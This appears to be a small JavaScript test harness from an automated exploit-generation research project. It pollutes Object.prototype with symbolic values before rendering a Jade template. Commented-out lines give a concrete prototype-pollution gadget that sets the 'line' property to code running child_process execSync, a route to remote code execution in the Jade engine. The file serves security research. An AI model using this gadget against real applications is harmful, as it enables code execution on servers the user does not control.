var jade = require('jade');
var S$ = require('../../../lib/S$');

Object.prototype.compileDebug = S$.pureSymbol('compileDebug_undef');
Object.prototype.self = S$.pureSymbol('self_undef');
Object.prototype.line = S$.pureSymbol('line_undef');

// Object.prototype.compileDebug = 1;
// Object.prototype.self = 1;
// Object.prototype.line = "console.log(global.process.mainModule.require('child_process').execSync('touch a.txt'))"

jade.renderFile('/home/ubuntu/PPAEG/ExpoSE+/tests/template_engines/jade/index.jade');